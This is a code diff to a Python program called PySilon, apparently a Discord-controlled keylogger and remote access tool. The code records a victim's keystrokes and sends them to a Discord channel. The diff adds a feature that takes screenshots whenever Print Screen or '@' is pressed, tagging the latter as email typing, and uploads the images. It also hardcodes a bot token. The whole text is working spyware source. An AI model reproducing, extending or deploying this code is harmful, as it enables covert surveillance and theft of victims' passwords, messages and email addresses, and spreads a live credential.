@@ -14,9 +14,9 @@ from resources.misc import *
 client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
-messages_to_send, files_to_send = [], []
+messages_to_send, files_to_send, embeds_to_send = [], [], []
 
-bot_token = ''   # Paste here BOT-token
+bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
@@ -39,7 +39,7 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():
-    global text_buffor, force_to_send, messages_to_send
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send
     await client.get_channel(channel_ids['main']).send('```[' + current_time() + '] New PC session```')
     while True:
         if len(messages_to_send) > 0:
@@ -54,6 +54,11 @@ async def on_ready():
                 if file[3]:
                     os.system('del ' + file[2])
             messages_to_send = []
+        if len(embeds_to_send) > 0:
+            for embedd in embeds_to_send:
+                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
+                await asyncio.sleep(0.1)
+            embeds_to_send = []
         await asyncio.sleep(1)
 
 @client.event
@@ -76,7 +81,7 @@ async def on_message(message):
     '''
 
 def on_press(key):
-    global text_buffor, force_to_send, messages_to_send
+    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
     processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
     if processed_key in ctrl_codes.keys():
         processed_key = ' `' + ctrl_codes[processed_key] + '`'
@@ -85,6 +90,10 @@ def on_press(key):
             case Key.space: processed_key = ' '
             case Key.shift: processed_key = ' *`SHIFT`*'
             case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
+            case Key.print_screen|'@':
+                pyautogui.screenshot().save('ss.png')
+                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
+
         text_buffor += str(processed_key)
         if len(text_buffor) > 1975:
             messages_to_send.append([channel_ids['main'], text_buffor])
